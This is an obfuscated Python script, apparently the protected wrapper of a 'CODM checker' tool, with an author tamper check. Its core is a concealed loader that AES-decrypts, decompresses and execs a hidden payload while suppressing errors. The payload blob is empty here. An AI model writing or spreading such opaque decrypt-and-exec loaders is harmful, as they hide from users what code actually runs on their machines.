author = 's1n'
tgChannel = 't.me/mksln'
website = 'https://sin-codmchecker.giize.com/'

import base64 as tDDSwKc
a4nTUiT7gdC8U = 'emxpYg=='
lFv4ZSIdrJnHqsn = 'Q3J5cHRvLkNpcGhlcg=='
BPmFQ2Wiu84nA = 'QUVT'
TSvXbcDAGIokPJmW3S = 'c3lz'
g13hNvSCmJ_qaE_ = __import__(tDDSwKc.b64decode(a4nTUiT7gdC8U).decode('utf-8'))
KrMCkm = __import__(tDDSwKc.b64decode(TSvXbcDAGIokPJmW3S).decode('utf-8'))
try:
    BKXZfHxAtu39U = __import__(tDDSwKc.b64decode(lFv4ZSIdrJnHqsn).decode('utf-8'), fromlist=[tDDSwKc.b64decode(BPmFQ2Wiu84nA).decode('utf-8')])
    oNfWdKmKhhz0aR = getattr(BKXZfHxAtu39U, tDDSwKc.b64decode(BPmFQ2Wiu84nA).decode('utf-8'))
except Exception:
    oNfWdKmKhhz0aR = None
Jbmvxd_x = 'czFu'
Kidz2f8hmpUQcw4 = 'dC5tZS9ta3Nsbg=='
_FRgd1hk6qEll = 'aHR0cHM6Ly9zaW4tY29kbWNoZWNrZXIuZ2lpemUuY29tLw=='
LzNX7jEfJWNc = ''
OGvzzfDp = 'aEVZVG0xQTRqTXpjM3FGRlN1YkNYQT09'
rqpvTmT0jB = 'Sm5qVDFlbU56OVhYSkpoWUw0U2dPc1NENjk5RWdMVm9tMjdHUGV0QW1RMD0='
oYpTd4T = 'aitJZ1lVYytpV0d0dm4wVA=='
e2SWrzImCsAYLr = 'WVhWMGFHOXlJRDBnSjNNeGJpYz0KZEdkRGFHRnVibVZzSUQwZ0ozUXViV1V2Yld0emJHNG4KZDJWaWMybDBaU0E5SUNkb2RIUndjem92TDNOcGJpMWpiMlJ0WTJobFkydGxjaTVuYVdsNlpTNWpiMjB2Snc9PQ=='
HgQ5XxBwrg3TMsmR = 'SVNBIEtBTkcgTEVHSVQgTkEgTUFLQVNBTEFOQU4sIElUTyBPV05FUiBPSDogczFuLCB0Lm1lL21rc2xu'
def ltJdJa():
    try:
        _decoded_expected_header_joined = tDDSwKc.b64decode(e2SWrzImCsAYLr).decode('utf-8')
        _expected_lines_b64 = _decoded_expected_header_joined.split('\n')
        _expected_plain_lines = [ tDDSwKc.b64decode(line).decode('utf-8') for line in _expected_lines_b64 ]
        _num_expected_lines = len(_expected_plain_lines)
        _actual_lines = []
        with open(__file__, 'r', encoding='utf-8') as f_self:
            for _i in range(_num_expected_lines):
                _line = f_self.readline().strip('\r\n')
                _actual_lines.append(_line)
        if _actual_lines != _expected_plain_lines:
            _decoded_msg = tDDSwKc.b64decode(HgQ5XxBwrg3TMsmR).decode('utf-8')
            print(_decoded_msg)
            KrMCkm.exit(1)
        return True
    except Exception:
        return False
def _DJvSGOl6igY7uK():
    if not ltJdJa(): return
    if oNfWdKmKhhz0aR is None: return
    try:
        cLG8Hpy6 = tDDSwKc.b64decode(tDDSwKc.b64decode(rqpvTmT0jB).decode('utf-8'))
        u522syxzziFe2Ly0 = tDDSwKc.b64decode(tDDSwKc.b64decode(oYpTd4T).decode('utf-8'))
        hi5ic4W = tDDSwKc.b64decode(tDDSwKc.b64decode(LzNX7jEfJWNc).decode('utf-8'))
        R1sX2i = tDDSwKc.b64decode(tDDSwKc.b64decode(OGvzzfDp).decode('utf-8'))
        _op_pred_author_check = tDDSwKc.b64decode(Jbmvxd_x).decode('utf-8') == 's1n'
        if not (len(cLG8Hpy6) + len(u522syxzziFe2Ly0) == 44 and _op_pred_author_check): return
        zrUVhWmmqKeRAIvQ = oNfWdKmKhhz0aR.new(cLG8Hpy6, oNfWdKmKhhz0aR.MODE_GCM, nonce=u522syxzziFe2Ly0)
        q22arSvksRTiRgMd1 = zrUVhWmmqKeRAIvQ.decrypt_and_verify(hi5ic4W, R1sX2i)
        VlPLg9TRlrolqKSUTA = g13hNvSCmJ_qaE_.decompress(q22arSvksRTiRgMd1)
        kHvL5ehjneJKLf = VlPLg9TRlrolqKSUTA.decode('utf-8')
        Fq2EXBSBr5ODaY = globals()
        NVPS88XZZgaYwZ97Q4 = tDDSwKc.b64decode(b'X19maWxlX18=').decode('utf-8')
        bMauaF7usG = tDDSwKc.b64decode(b'X19uYW1lX18=').decode('utf-8')
        FXbsTM4fY = tDDSwKc.b64decode(b'X19tYWluX18=').decode('utf-8')
        oYFNSfeXASZWal = Fq2EXBSBr5ODaY.copy()
        oYFNSfeXASZWal.update({
            NVPS88XZZgaYwZ97Q4: Fq2EXBSBr5ODaY.get(NVPS88XZZgaYwZ97Q4, 'executed_string_default_path'),
            bMauaF7usG: FXbsTM4fY,
        })
        crOCkm8witS = tDDSwKc.b64decode(b'ZXhlYw==').decode('utf-8')
        getattr(__builtins__, crOCkm8witS)(kHvL5ehjneJKLf, oYFNSfeXASZWal, oYFNSfeXASZWal)
    except Exception: pass
Fq2EXBSBr5ODaY = globals()
FXbsTM4fY = tDDSwKc.b64decode(b'X19tYWluX18=').decode('utf-8')
NVPS88XZZgaYwZ97Q4 = tDDSwKc.b64decode(b'X19maWxlX18=').decode('utf-8')
w43MFnHExF7M = tDDSwKc.b64decode(b'X19idWlsdGluc19f').decode('utf-8')
_cond1 = hasattr(Fq2EXBSBr5ODaY.get(w43MFnHExF7M), tDDSwKc.b64decode(b'Z2V0YXR0cg==').decode('utf-8'))
_cond2_a = Fq2EXBSBr5ODaY.get(NVPS88XZZgaYwZ97Q4, '').endswith('_obf.py')
_cond2_b = Fq2EXBSBr5ODaY.get('__name__') == FXbsTM4fY
if _cond1 and (_cond2_a or _cond2_b):
    _DJvSGOl6igY7uK()